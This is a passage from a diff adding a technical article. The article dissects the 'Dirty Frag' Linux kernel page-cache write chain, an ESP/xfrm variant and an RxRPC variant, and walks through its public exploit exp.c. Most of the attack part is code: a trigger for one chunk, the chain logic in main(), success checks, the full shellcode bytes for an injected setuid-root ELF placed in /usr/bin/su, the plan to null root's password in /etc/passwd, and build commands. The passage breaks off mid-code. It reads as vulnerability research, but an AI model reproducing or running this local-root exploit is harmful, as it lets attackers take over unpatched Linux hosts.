+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">crypto/authencesn.c — pre-auth 4-byte STORE</span></div>
+        <pre><code><span class="hl-kw">static int</span> <span class="hl-fn">crypto_authenc_esn_decrypt</span>(<span class="hl-kw">struct</span> <span class="hl-type">aead_request</span> *req)
+{
+    [...]
+    <span class="hl-cm">/* Move high-order bits of sequence number to the end. */</span>
+    <span class="hl-fn">scatterwalk_map_and_copy</span>(tmp, src, <span class="hl-num">0</span>, <span class="hl-num">8</span>, <span class="hl-num">0</span>);
+    <span class="hl-kw">if</span> (src == dst) {
+        <span class="hl-fn">scatterwalk_map_and_copy</span>(tmp, dst, <span class="hl-num">4</span>, <span class="hl-num">4</span>, <span class="hl-num">1</span>);
+        <span class="hl-fn">scatterwalk_map_and_copy</span>(tmp + <span class="hl-num">1</span>, dst,
+                                   assoclen + cryptlen, <span class="hl-num">4</span>, <span class="hl-num">1</span>); <span class="hl-cm">/* ← STORE at attacker-chosen offset */</span>
+    }
+    [...]
+    <span class="hl-cm">/* HMAC verification happens HERE — after the STORE — and fails with EBADMSG */</span>
+    <span class="hl-cm">/* But the page cache modification already happened and is not rolled back */</span></code></pre>
+      </div>
+
+      <p>The 4 bytes written come from <span class="ic">tmp + 1</span> — which holds the high 32 bits of the sequence number from the SA's <span class="ic">replay_esn->seq_hi</span> field. The attacker registers the SA via netlink with an arbitrary <span class="ic">seq_hi</span> value. The write offset is <span class="ic">assoclen + cryptlen</span>, where <span class="ic">cryptlen</span> is chosen by the attacker to equal the target file offset. The attacker has full control over both the value written and where it lands.</p>
+
+      <div class="callout callout-danger">
+        <strong>SA Registration Requires CAP_NET_ADMIN — But User Namespaces Grant It</strong>
+        Unlike Copy Fail's <span class="ic">AF_ALG</span> entry point which any user can open, registering an XFRM Security Association requires the <span class="ic">CAP_NET_ADMIN</span> capability — normally a root-only privilege. However, Linux user namespaces let any unprivileged user call <span class="ic">unshare(CLONE_NEWUSER | CLONE_NEWNET)</span> to create a sandboxed "bubble" where they appear as root and hold all capabilities, including <span class="ic">CAP_NET_ADMIN</span>, but only within that bubble. The host OS sees none of it. The exploit creates this sandbox for SA registration only; the actual page-cache write affects the real host. Ubuntu's default AppArmor policy blocks this <span class="ic">unshare()</span> call — which is exactly why the RxRPC fallback variant exists.
+      </div>
+    </div>
+
+    <div class="subsection" id="s3-3">
+      <h3 class="subsection-heading">Exploit Flow — ELF Injection into /usr/bin/su</h3>
+      <p>The ESP exploit takes the same approach as Copy Fail: overwrite the first 192 bytes of <span class="ic">/usr/bin/su</span>'s page cache with a minimal 192-byte ELF that calls <span class="ic">setgid(0); setuid(0); setgroups(0, NULL); execve("/bin/sh", ...)</span>. The 192 bytes are split into 48 chunks of 4 bytes each, written one at a time via the 4-byte STORE primitive.</p>
+
+      <div class="steps">
+        <div class="step-card">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <h4>Unshare into a new user+net namespace</h4>
+            <p><span class="ic">unshare(CLONE_NEWUSER | CLONE_NEWNET)</span> gives the child root inside the new namespace. Identity UID/GID maps are written, and loopback is brought up. This gives <span class="ic">CAP_NET_ADMIN</span> for XFRM SA registration.</p>
+          </div>
+        </div>
+        <div class="step-card">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <h4>Register 48 XFRM Security Associations</h4>
+            <p>One SA per 4-byte chunk. Each SA uses <span class="ic">authencesn(hmac(sha256), cbc(aes))</span> with UDP encapsulation (port 4500), <span class="ic">XFRM_STATE_ESN</span> flag, and the desired 4-byte shellcode value placed in <span class="ic">XFRMA_REPLAY_ESN_VAL.seq_hi</span>. The HMAC/AES keys are arbitrary — authentication will fail anyway.</p>
+          </div>
+        </div>
+        <div class="step-card">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <h4>For each 4-byte chunk: splice + send</h4>
+            <p>A forged ESP wire header (SPI + seq_no + IV) is written into a pipe via <span class="ic">vmsplice</span>. Then 16 bytes of <span class="ic">/usr/bin/su</span> at offset <span class="ic">i×4</span> are spliced into the pipe — planting the page cache page reference into the frag. The pipe is then spliced to a UDP socket connected to the local port with <span class="ic">UDP_ENCAP_ESPINUDP</span> set, sending the packet over loopback.</p>
+          </div>
+        </div>
+        <div class="step-card">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <h4>Kernel receive path triggers the STORE</h4>
+            <p>The packet is routed: <span class="ic">udp_rcv → xfrm4_udp_encap_rcv → xfrm_input → esp_input</span>. The vulnerable <span class="ic">skip_cow</span> branch is taken (non-cloned, has frag, no frag_list). The <span class="ic">crypto_authenc_esn_decrypt</span> call writes <span class="ic">seq_hi</span> into the page cache at offset <span class="ic">i×4</span>. HMAC returns <span class="ic">EBADMSG</span> — but the write already happened.</p>
+          </div>
+        </div>
+        <div class="step-card">
+          <div class="step-num">5</div>
+          <div class="step-body">
+            <h4>Execute the modified binary</h4>
+            <p>After 48 iterations, the full ELF payload is assembled in <span class="ic">/usr/bin/su</span>'s page cache. The parent process (real UID) calls <span class="ic">forkpty + execve("/usr/bin/su", "-")</span>. The setuid-root bit is intact on disk, so the kernel runs the binary as root — but loads it from the corrupted cache. Root shell drops.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">exp.c — one chunk trigger (simplified)</span></div>
+        <pre><code><span class="hl-cm">/* Forged ESP wire header: SPI(4) + seq_lo(4) + IV(16) */</span>
+<span class="hl-type">uint8_t</span> hdr[<span class="hl-num">24</span>];
+*(<span class="hl-type">uint32_t</span> *)(hdr + <span class="hl-num">0</span>) = <span class="hl-fn">htonl</span>(spi);       <span class="hl-cm">/* per-chunk SPI */</span>
+*(<span class="hl-type">uint32_t</span> *)(hdr + <span class="hl-num">4</span>) = <span class="hl-fn">htonl</span>(<span class="hl-num">100</span>);        <span class="hl-cm">/* seq_lo */</span>
+<span class="hl-fn">memset</span>(hdr + <span class="hl-num">8</span>, <span class="hl-num">0xCC</span>, <span class="hl-num">16</span>);                  <span class="hl-cm">/* IV (value irrelevant) */</span>
+
+<span class="hl-cm">/* Plant page cache page P of /usr/bin/su into the pipe */</span>
+<span class="hl-fn">vmsplice</span>(pfd[<span class="hl-num">1</span>], &(<span class="hl-kw">struct</span> iovec){hdr, <span class="hl-num">24</span>}, <span class="hl-num">1</span>, <span class="hl-num">0</span>);
+<span class="hl-fn">splice</span>(file_fd, &(<span class="hl-type">off_t</span>){i*<span class="hl-num">4</span>}, pfd[<span class="hl-num">1</span>], <span class="hl-kw">NULL</span>, <span class="hl-num">16</span>, SPLICE_F_MOVE);
+
+<span class="hl-cm">/* Send pipe → socket: MSG_SPLICE_PAGES auto-set, page stays as frag */</span>
+<span class="hl-fn">splice</span>(pfd[<span class="hl-num">0</span>], <span class="hl-kw">NULL</span>, sk_send, <span class="hl-kw">NULL</span>, <span class="hl-num">24</span> + <span class="hl-num">16</span>, SPLICE_F_MOVE);
+
+<span class="hl-cm">/* esp_input() takes skip_cow branch → authencesn_decrypt writes seq_hi at offset i*4
+   EBADMSG returned but write is permanent — page cache modified */</span></code></pre>
+      </div>
+    </div>
+  </section>
+
+  <hr class="section-divider">
+
+  <!-- SECTION 4 -->
+  <section class="article-section" id="s4">
+    <h2 class="section-heading"><i class="sh-icon fa-solid fa-bug"></i> Variant 2: RxRPC Page-Cache Write (CVE-2026-43500)</h2>
+
+    <div class="subsection" id="s4-1">
+      <h3 class="subsection-heading">Root Cause — In-Place pcbc(fcrypt) Decrypt on Spliced Frags</h3>
+      <p>RxRPC is the Linux kernel's implementation of the AFS (Andrew File System) RPC transport protocol. When a connection uses <span class="ic">RXKAD</span> security at the <span class="ic">RXRPC_SECURITY_AUTH</span> level, incoming data packets are verified by <span class="ic">rxkad_verify_packet_1()</span>, which performs an in-place 8-byte decrypt using <span class="ic">pcbc(fcrypt)</span> — the classic AFS cipher — to validate packet integrity.</p>
+
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">net/rxrpc/rxkad.c — vulnerable in-place decrypt</span></div>
+        <pre><code><span class="hl-kw">static int</span> <span class="hl-fn">rxkad_verify_packet_1</span>(<span class="hl-kw">struct</span> <span class="hl-type">rxrpc_call</span> *call,
+                                  <span class="hl-kw">struct</span> <span class="hl-type">sk_buff</span> *skb, ...)
+{
+    [...]
+    <span class="hl-fn">sg_init_table</span>(sg, ARRAY_SIZE(sg));
+    ret = <span class="hl-fn">skb_to_sgvec</span>(skb, sg, sp->offset, <span class="hl-num">8</span>); <span class="hl-cm">/* converts frags to SGL */</span>
+
+    <span class="hl-fn">memset</span>(&iv, <span class="hl-num">0</span>, <span class="hl-kw">sizeof</span>(iv));
+    <span class="hl-fn">skcipher_request_set_crypt</span>(req, sg, sg, <span class="hl-num">8</span>, iv.x); <span class="hl-cm">/* src == dst: IN-PLACE */</span>
+    ret = <span class="hl-fn">crypto_skcipher_decrypt</span>(req); <span class="hl-cm">/* 8-byte STORE directly into frag */</span>
+
+    <span class="hl-cm">/* If frag is a page cache page (planted via splice): </span>
+<span class="hl-cm">       8 bytes written into that file's in-RAM copy */</span></code></pre>
+      </div>
+
+      <p>The code preceding this function (<span class="ic">call_event.c:337</span>) only unshares the skb if <span class="ic">skb_cloned(skb)</span> is true. A non-linear skb with page cache pages in its frags via <span class="ic">splice()</span> is <em>not</em> cloned in that sense, so it bypasses the copy and hits the in-place decrypt path directly.</p>
+    </div>
+
+    <div class="subsection" id="s4-2">
+      <h3 class="subsection-heading">The 8-Byte Brute-Forced Write Primitive</h3>
+      <p>Unlike the ESP variant's clean 4-byte arbitrary write, the RxRPC variant provides a more constrained primitive: the 8 bytes written into the page cache are <span class="ic">fcrypt_decrypt(C, K)</span> — the result of decrypting the 8-byte ciphertext <span class="ic">C</span> (currently at the target file offset) with key <span class="ic">K</span> (the attacker's RxRPC session key).</p>
+      <p>The attacker controls <span class="ic">K</span> via <span class="ic">add_key("rxrpc", ...)</span>, which requires no privileges at all. Since <span class="ic">fcrypt</span> is a deterministic public algorithm with a 56-bit key space, and because the IV is zero and only one 8-byte block is decrypted, <span class="ic">pcbc(fcrypt)</span> reduces to a single <span class="ic">fcrypt_decrypt(C, K)</span> call with no chaining. The attacker can therefore brute-force the desired plaintext in userspace: iterate over candidate keys K until <span class="ic">fcrypt_decrypt(C, K)</span> produces the bytes they want to plant. This sounds expensive, but the target bytes only need to satisfy loose conditions — not all 8 bytes are fully constrained — making the search tractable. A userspace port of <span class="ic">crypto/fcrypt.c</span> runs at ~18 million keys/second, completing each search in well under 1 second.</p>
+      <div class="callout callout-info">
+        <strong>No CAP_NET_ADMIN Required</strong>
+        This is the key advantage of the RxRPC variant over the ESP variant. <span class="ic">add_key("rxrpc", ...)</span>, <span class="ic">socket(AF_RXRPC)</span>, and <span class="ic">splice()</span> are all available to completely unprivileged users. No user namespace creation is needed. On Ubuntu, where AppArmor blocks <span class="ic">unshare(CLONE_NEWUSER)</span> by default, the RxRPC variant is the path to root.
+      </div>
+    </div>
+
+    <div class="subsection" id="s4-3">
+      <h3 class="subsection-heading">Exploit Flow — /etc/passwd Nulling</h3>
+      <p>Writing an arbitrary static ELF via 8-byte brute-force is impractical (full 56-bit key space with all 8 bytes constrained). So the RxRPC exploit targets a more achievable goal: null the <span class="ic">passwd</span> field of root's entry in <span class="ic">/etc/passwd</span> line 1, turning it from <span class="ic">root:x:0:0:...</span> into <span class="ic">root::0:0:...</span>. PAM's <span class="ic">pam_unix.so</span> with the <span class="ic">nullok</span> option then accepts an empty password for root — letting <span class="ic">su</span> succeed without any credential.</p>
+      <p>The target: chars 4–15 of <span class="ic">/etc/passwd</span> line 1 must become <span class="ic">::0:0:GGGGGG:</span>. Only 12 bytes need to be decided, and 5 of those (the fill chars at positions 10–14) just need to be any printable non-colon character — a weak enough constraint to make the brute force feasible in milliseconds.</p>
+      <p>Three overlapping 8-byte STOREs with last-write-wins semantics accomplish this:</p>
+
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">Text</span><span class="cb-file">/etc/passwd line 1 — before and after</span></div>
+        <pre><code><span class="hl-cm">File offset:  0 1 2 3 4  5 6 7 8 9 10 11 12 13 14 15</span>
+<span class="hl-cm">Original:     r o o t :  x : 0 : 0  :  r  o  o  t  :</span>
+
+<span class="hl-green">splice A @ offset 4  (8B) → writes chars 4..11</span>
+<span class="hl-green">splice B @ offset 6  (8B) → writes chars 6..13  (overwrites 6..11 from A)</span>
+<span class="hl-green">splice C @ offset 8  (8B) → writes chars 8..15  (overwrites 8..13 from B)</span>
+
+<span class="hl-acc">Result:       r o o t :  : 0 : 0 :  G  G  G  G  G  :</span>
+<span class="hl-acc">              └──────────────────────────────────────┘</span>
+<span class="hl-acc">              root::0:0:GGGGG:/root:/bin/bash  ← empty passwd, PAM nullok passes</span></code></pre>
+      </div>
+
+      <p>For each STORE, a userspace brute-force search finds the RxRPC key K such that <span class="ic">fcrypt_decrypt(C, K) == desired_plaintext</span>. The ciphertext seen by each subsequent splice is the plaintext left by the previous STORE — so the brute forces must be chained, each accounting for the mutation left by the last. A user-space port of <span class="ic">crypto/fcrypt.c</span> running at ~18 million keys/second completes each search in under 1 second.</p>
+      <p>After all three STOREs, the parent process calls <span class="ic">forkpty + execve("/usr/bin/su", "-")</span>. PAM reads the modified <span class="ic">/etc/passwd</span> from page cache, sees an empty password field, and with <span class="ic">nullok</span> grants the login without a password prompt. <span class="ic">su</span> performs <span class="ic">setresuid(0, 0, 0)</span> and drops into <span class="ic">/bin/bash</span> as root.</p>
+    </div>
+  </section>
+
+  <hr class="section-divider">
+
+  <!-- SECTION 5 -->
+  <section class="article-section" id="s5">
+    <h2 class="section-heading"><i class="sh-icon fa-solid fa-link"></i> Why Chaining? Covering Each Other's Blind Spots</h2>
+
+    <p>Neither variant works universally on its own. The ESP variant requires <span class="ic">CAP_NET_ADMIN</span> — achievable via user namespaces, but Ubuntu's default AppArmor policy blocks unprivileged <span class="ic">unshare(CLONE_NEWUSER)</span>. The RxRPC variant requires no privileges, but <span class="ic">rxrpc.ko</span> is not included in most enterprise distributions (RHEL, CentOS, AlmaLinux ship without it). Together, they cover the full distribution landscape:</p>
+
+          <div class="variant-grid">
+      <div class="variant-card">
+        <span class="vc-label">// ESP Variant (CVE-2026-43284)</span>
+        <h4>xfrm-ESP Page-Cache Write</h4>
+        <ul>
+          <li>4-byte arbitrary STORE, fully controlled value and offset</li>
+          <li>Writes 192-byte ELF into <span class="ic">/usr/bin/su</span> page cache</li>
+          <li>Needs <span class="ic">unshare(CLONE_NEWUSER|NEWNET)</span> in a child process</li>
+          <li>Blocked by Ubuntu AppArmor user-ns policy by default</li>
+          <li>Works on RHEL, Fedora, CentOS, openSUSE, AlmaLinux</li>
+          <li>Wall-clock cost: ~7 seconds (48 writes x 150ms sleep each)</li>
+          <li>Patched: mainline commit <span class="ic">f4c50a4034e6</span></li>
+        </ul>
+      </div>
+      <div class="variant-card">
+        <span class="vc-label">// RxRPC Variant (CVE-2026-43500)</span>
+        <h4>RxRPC Page-Cache Write</h4>
+        <ul>
+          <li>8-byte brute-forced STORE via userspace fcrypt key search</li>
+          <li>Nulls password field in <span class="ic">/etc/passwd</span> root entry</li>
+          <li>Zero privileges required, no namespace creation needed</li>
+          <li>Requires <span class="ic">rxrpc.ko</span> to be present and loadable</li>
+          <li>Works on Ubuntu (rxrpc.ko built and loadable by default)</li>
+          <li>No upstream patch merged as of May 8, 2026</li>
+        </ul>
+      </div>
+    </div>
+
+    <p>The combined exploit logic tries ESP first. If it succeeds, the parent process confirms by checking the 8-byte marker in <span class="ic">/usr/bin/su</span>'s page cache and then runs <span class="ic">su -</span> to get a root shell through the injected ELF. If the ESP attempt fails, for example because <span class="ic">unshare()</span> returned <span class="ic">EPERM</span>, or because <span class="ic">esp4.ko</span> is absent, the exploit falls back to the RxRPC path and nulls the root password field in <span class="ic">/etc/passwd</span> instead.</p>
+
+    <div class="callout callout-danger">
+      <strong>One Binary. Every Major Distro. Under One Second.</strong>
+      The public <span class="ic">exp.c</span> is a single C file. Compiled with <span class="ic">gcc -O0 -Wall -o exp exp.c -lutil</span>, it runs the full chain automatically, selects the appropriate variant, and delivers a root shell on Ubuntu, RHEL, Fedora, openSUSE, CentOS, and AlmaLinux. No kernel symbols. No heap grooming. No timing windows.
+    </div>
+
+    <div class="callout callout-warn">
+      <strong>Post-Exploit Cleanup Required</strong>
+      Unlike Copy Fail, Dirty Frag leaves the page cache in a contaminated state after exploitation — the modified pages persist even if the exploit exits. On systems where this matters (production hosts), you must run <span class="ic">echo 3 > /proc/sys/vm/drop_caches</span> or reboot after exploitation to restore correct file contents. From a forensics perspective this means the in-memory evidence is easily wiped while the on-disk files remain untouched.
+    </div>
+  </section>
+
+  <hr class="section-divider">
+
+  <!-- SECTION — PoC Deep Dive -->
+  <section class="article-section" id="s-poc">
+    <h2 class="section-heading"><i class="sh-icon fa-solid fa-code"></i> PoC Deep Dive — Reading exp.c</h2>
+
+    <p>The public exploit (<span class="ic">exp.c</span>, 1951 lines, C) is a single self-contained file that implements both attack variants plus the chaining logic. There is no Python, no scripting, no compiled kernel module — just a standard C binary linked against <span class="ic">-lutil</span> for the PTY helper. Let's walk through exactly what it does, function by function.</p>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">Top-Level Structure and the Chain Logic</h3>
+      <p>The binary is a single C file (~1951 lines) with three logical sections compiled together: <span class="ic">su_lpe_main()</span> for the ESP/xfrm path targeting <span class="ic">/usr/bin/su</span>, <span class="ic">rxrpc_lpe_main()</span> for the RxRPC path targeting <span class="ic">/etc/passwd</span>, and <span class="ic">main()</span> which chains them. The chaining logic is more sophisticated than a simple fallback — it checks whether either target is already patched before deciding what to run, and retries the RxRPC path up to 3 times:</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">exp.c — main() chain logic (actual code)</span></div>
+        <pre><code><span class="hl-cm">/* If already running as root somehow, just exec bash */</span>
+<span class="hl-kw">if</span> (<span class="hl-fn">getuid</span>() == <span class="hl-num">0</span>) { <span class="hl-fn">execlp</span>(<span class="hl-str">"/bin/bash"</span>, <span class="hl-str">"bash"</span>, <span class="hl-kw">NULL</span>); }
+
+<span class="hl-cm">/* Append "--corrupt-only" to argv for both sub-mains */</span>
+co_argv = <span class="hl-fn">append_corrupt_only</span>(argc, argv, &new_argc);
+
+<span class="hl-kw">if</span> (!verbose) <span class="hl-fn">silence_stderr</span>(&saved_err); <span class="hl-cm">/* suppress noise by default */</span>
+
+<span class="hl-kw">if</span> (force_rxrpc) {
+    <span class="hl-cm">/* --force-rxrpc: only try RxRPC path, up to 3 retries */</span>
+    rc = <span class="hl-fn">rxrpc_lpe_main</span>(new_argc, co_argv);
+    <span class="hl-kw">for</span> (<span class="hl-kw">int</span> i = <span class="hl-num">0</span>; !<span class="hl-fn">passwd_already_patched</span>() && i < <span class="hl-num">3</span>; i++)
+        rc = <span class="hl-fn">rxrpc_lpe_main</span>(new_argc, co_argv);
+} <span class="hl-kw">else if</span> (force_esp) {
+    <span class="hl-cm">/* --force-esp: only try ESP path */</span>
+    rc = <span class="hl-fn">su_lpe_main</span>(new_argc, co_argv);
+} <span class="hl-kw">else</span> {
+    <span class="hl-cm">/* Default: try ESP first */</span>
+    rc = <span class="hl-fn">su_lpe_main</span>(new_argc, co_argv);
+    <span class="hl-kw">if</span> (!<span class="hl-fn">su_already_patched</span>()) {
+        <span class="hl-cm">/* ESP didn't land — fall back to RxRPC, retry up to 3× */</span>
+        rc = <span class="hl-fn">rxrpc_lpe_main</span>(new_argc, co_argv);
+        <span class="hl-kw">for</span> (<span class="hl-kw">int</span> i = <span class="hl-num">0</span>; !<span class="hl-fn">passwd_already_patched</span>() && i < <span class="hl-num">3</span>; i++)
+            rc = <span class="hl-fn">rxrpc_lpe_main</span>(new_argc, co_argv);
+    }
+}
+
+<span class="hl-kw">if</span> (!verbose) <span class="hl-fn">restore_stderr</span>(saved_err);
+
+<span class="hl-cm">/* If either target is patched, open a root PTY via /usr/bin/su */</span>
+<span class="hl-kw">if</span> (<span class="hl-fn">either_target_patched</span>()) {
+    <span class="hl-fn">run_root_pty</span>(); <span class="hl-cm">/* spawns `su -` in fresh PTY, bridges tty */</span>
+    <span class="hl-kw">return</span> <span class="hl-num">0</span>;
+}</code></pre>
+      </div>
+
+      <p>Two helper functions check whether either target has been successfully poisoned. They work because <span class="ic">pread()</span> on a file whose page cache was modified reads the in-memory version — the on-disk file is untouched:</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">exp.c — success detection helpers</span></div>
+        <pre><code><span class="hl-cm">/* Check if /usr/bin/su page cache contains our injected shellcode.
+   Looks for the 8 bytes at offset 0x78: 31 ff 31 f6 31 c0 b0 6a
+   = "xor edi,edi; xor esi,esi; xor eax,eax; mov al,0x6a(setgid)"
+   These bytes are unique to our payload — the real su never has them. */</span>
+<span class="hl-kw">static const</span> <span class="hl-type">uint8_t</span> su_marker[<span class="hl-num">8</span>] = {
+    <span class="hl-num">0x31</span>, <span class="hl-num">0xff</span>, <span class="hl-num">0x31</span>, <span class="hl-num">0xf6</span>, <span class="hl-num">0x31</span>, <span class="hl-num">0xc0</span>, <span class="hl-num">0xb0</span>, <span class="hl-num">0x6a</span>
+};
+<span class="hl-kw">static int</span> <span class="hl-fn">su_already_patched</span>(<span class="hl-kw">void</span>) {
+    <span class="hl-kw">int</span> fd = <span class="hl-fn">open</span>(<span class="hl-str">"/usr/bin/su"</span>, O_RDONLY);
+    <span class="hl-type">uint8_t</span> got[<span class="hl-num">8</span>];
+    <span class="hl-fn">pread</span>(fd, got, <span class="hl-num">8</span>, <span class="hl-num">0x78</span>);  <span class="hl-cm">/* reads from page cache, not disk */</span>
+    <span class="hl-kw">return</span> <span class="hl-fn">memcmp</span>(got, su_marker, <span class="hl-num">8</span>) == <span class="hl-num">0</span>;
+}
+
+<span class="hl-cm">/* Check if /etc/passwd root entry starts with "root::0:0" — empty passwd */</span>
+<span class="hl-kw">static int</span> <span class="hl-fn">passwd_already_patched</span>(<span class="hl-kw">void</span>) {
+    <span class="hl-kw">int</span> fd = <span class="hl-fn">open</span>(<span class="hl-str">"/etc/passwd"</span>, O_RDONLY);
+    <span class="hl-kw">char</span> head[<span class="hl-num">16</span>];
+    <span class="hl-fn">pread</span>(fd, head, <span class="hl-num">16</span>, <span class="hl-num">0</span>);
+    <span class="hl-kw">return</span> <span class="hl-fn">memcmp</span>(head, <span class="hl-str">"root::0:0"</span>, <span class="hl-num">9</span>) == <span class="hl-num">0</span>;
+}</code></pre>
+      </div>
+
+      <p>The final stage — common to both paths — is <span class="ic">run_root_pty()</span>. It opens a PTY pair with <span class="ic">posix_openpt()</span>, forks a child that execs <span class="ic">su -</span> with the slave PTY as its stdin/stdout/stderr, and bridges the parent's terminal to the master side. If PAM prompts for a password (which it will in the RxRPC path since <span class="ic">pam_unix.so nullok</span> still shows a prompt on some configs), the bridge auto-injects a single newline — the empty password that the patched <span class="ic">/etc/passwd</span> entry now accepts. By default, all stderr output from the sub-mains is suppressed with <span class="ic">silence_stderr()</span>, making the exploit appear to the user as a clean single command that produces a root shell.</p>
+
+      <div class="callout callout-info">
+        <strong>Why pread() reveals the page cache modification</strong>
+        After either variant runs, <span class="ic">pread()</span> on the target file reads from the page cache — the kernel's in-memory copy — not from disk. The exploit never sets the dirty flag, so the on-disk file is identical to before. But the in-memory copy reflects the STORE that happened. This is the same property that makes the attack invisible to file integrity tools, and here the exploit exploits it again to check its own success.
+      </div>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">The Injected ELF Payload</h3>
+      <p>The 192-byte <span class="ic">shell_elf[]</span> array embedded in the binary is a fully valid, self-contained x86-64 ELF executable. It is not shellcode bolted onto a template — it is a minimal but correct ELF with a real header and a <span class="ic">PT_LOAD</span> program header. Here is what it does:</p>
+      <ul style="list-style:none;display:flex;flex-direction:column;gap:8px;margin:12px 0 18px 0;">
+        <li style="font-size:.87rem;color:var(--text2);padding-left:18px;position:relative;"><span style="position:absolute;left:0;color:var(--accent);">▸</span> ELF header (64 bytes): <span class="ic">e_type=ET_EXEC</span>, <span class="ic">e_machine=EM_X86_64</span>, entry point at virtual address <span class="ic">0x400078</span></li>
+        <li style="font-size:.87rem;color:var(--text2);padding-left:18px;position:relative;"><span style="position:absolute;left:0;color:var(--accent);">▸</span> PT_LOAD segment (56 bytes): maps file bytes 0..0xb7 to virtual address <span class="ic">0x400000</span>, flags R+X (readable and executable)</li>
+        <li style="font-size:.87rem;color:var(--text2);padding-left:18px;position:relative;"><span style="position:absolute;left:0;color:var(--accent);">▸</span> Shellcode (40 bytes at file offset <span class="ic">0x78</span> = vaddr <span class="ic">0x400078</span>): calls <span class="ic">setgid(0)</span>, <span class="ic">setuid(0)</span>, <span class="ic">setgroups(0, NULL)</span>, then <span class="ic">execve("/bin/sh", NULL, envp)</span> where <span class="ic">envp = ["TERM=xterm", NULL]</span></li>
+        <li style="font-size:.87rem;color:var(--text2);padding-left:18px;position:relative;"><span style="position:absolute;left:0;color:var(--accent);">▸</span> String data: <span class="ic">"TERM=xterm\0"</span> at offset <span class="ic">0xa5</span> and <span class="ic">"/bin/sh\0"</span> at offset <span class="ic">0xb0</span></li>
+      </ul>
+      <p>The <span class="ic">TERM=xterm</span> environment variable is intentionally set — without it, <span class="ic">/etc/bash.bashrc</span> and similar shell init scripts emit "No value for $TERM" errors that would clutter the root shell output.</p>
+      <p>Because <span class="ic">/usr/bin/su</span> has its setuid-root bit set on disk (the exploit never touches the disk), the kernel runs this injected ELF with effective UID 0 (root). The ELF's shellcode then locks in root with <span class="ic">setuid(0)</span>/<span class="ic">setgid(0)</span> and spawns <span class="ic">/bin/sh</span>.</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">asm</span><span class="cb-file">shellcode at ELF offset 0x78 (entry point 0x400078)</span></div>
+        <pre><code><span class="hl-cm">; syscall numbers: setgid=0x6a(106), setuid=0x69(105), setgroups=0x74(116), execve=0x3b(59)</span>
+31 ff          <span class="hl-fn">xor</span>    edi, edi           <span class="hl-cm">; arg0 = 0</span>
+31 f6          <span class="hl-fn">xor</span>    esi, esi
+31 c0          <span class="hl-fn">xor</span>    eax, eax
+b0 6a          <span class="hl-fn">mov</span>    al, 0x6a           <span class="hl-cm">; setgid(0)</span>
+0f 05          <span class="hl-fn">syscall</span>
+b0 69          <span class="hl-fn">mov</span>    al, 0x69           <span class="hl-cm">; setuid(0)</span>
+0f 05          <span class="hl-fn">syscall</span>
+b0 74          <span class="hl-fn">mov</span>    al, 0x74           <span class="hl-cm">; setgroups(0, NULL)</span>
+0f 05          <span class="hl-fn">syscall</span>
+6a 00          <span class="hl-fn">push</span>   0               <span class="hl-cm">; envp[1] = NULL sentinel</span>
+48 8d 05 12 00 00 00  <span class="hl-fn">lea</span> rax,[rip+0x12]  <span class="hl-cm">; rax → "TERM=xterm\0" at 0xa5</span>
+50             <span class="hl-fn">push</span>   rax             <span class="hl-cm">; envp[0] = "TERM=xterm"</span>
+48 89 e2       <span class="hl-fn">mov</span>    rdx, rsp        <span class="hl-cm">; rdx = envp[]</span>
+48 8d 3d 12 00 00 00  <span class="hl-fn">lea</span> rdi,[rip+0x12]  <span class="hl-cm">; rdi → "/bin/sh\0" at 0xb0</span>
+31 f6          <span class="hl-fn">xor</span>    esi, esi        <span class="hl-cm">; rsi = NULL (argv)</span>
+6a 3b          <span class="hl-fn">push</span>   0x3b
+58             <span class="hl-fn">pop</span>    rax             <span class="hl-cm">; rax = 59 (execve)</span>
+0f 05          <span class="hl-fn">syscall</span>             <span class="hl-cm">; execve("/bin/sh", NULL, ["TERM=xterm",NULL])</span></code></pre>
+      </div>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">ESP Variant: setup_userns_netns() and add_xfrm_sa()</h3>
+      <p><span class="ic">corrupt_su()</span> first calls <span class="ic">setup_userns_netns()</span>, which creates the user+net namespace sandbox. This is where <span class="ic">CAP_NET_ADMIN</span> is acquired. The UID map written is <span class="ic">"0 &lt;real_uid&gt; 1"</span> — meaning inside this namespace, real UID 1000 (or whatever your UID is) maps to UID 0. Loopback is brought UP with <span class="ic">SIOCSIFFLAGS</span> because the exploit routes packets over loopback, and loopback is DOWN by default in a fresh netns.</p>
+      <p>Then all 48 XFRM SAs are registered upfront in one batch before any trigger fires — one SA per 4-byte chunk of <span class="ic">shell_elf[]</span>. Each SA has a unique SPI (<span class="ic">0xDEADBE10 + i</span>) and carries the chunk value in <span class="ic">esn->seq_hi</span> packed as a big-endian <span class="ic">uint32_t</span>:</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">exp.c — packing shellcode chunk into seq_hi (big-endian)</span></div>
+        <pre><code><span class="hl-kw">for</span> (<span class="hl-kw">int</span> i = <span class="hl-num">0</span>; i < PAYLOAD_LEN / <span class="hl-num">4</span>; i++) {  <span class="hl-cm">/* 48 iterations */</span>
+    <span class="hl-type">uint32_t</span> spi     = <span class="hl-num">0xDEADBE10</span> + i;
+    <span class="hl-type">uint32_t</span> seqhi   =
+        ((<span class="hl-type">uint32_t</span>)shell_elf[i*<span class="hl-num">4</span> + <span class="hl-num">0</span>] << <span class="hl-num">24</span>) |  <span class="hl-cm">/* most-significant byte first */</span>
+        ((<span class="hl-type">uint32_t</span>)shell_elf[i*<span class="hl-num">4</span> + <span class="hl-num">1</span>] << <span class="hl-num">16</span>) |
+        ((<span class="hl-type">uint32_t</span>)shell_elf[i*<span class="hl-num">4</span> + <span class="hl-num">2</span>] <<  <span class="hl-num">8</span>) |
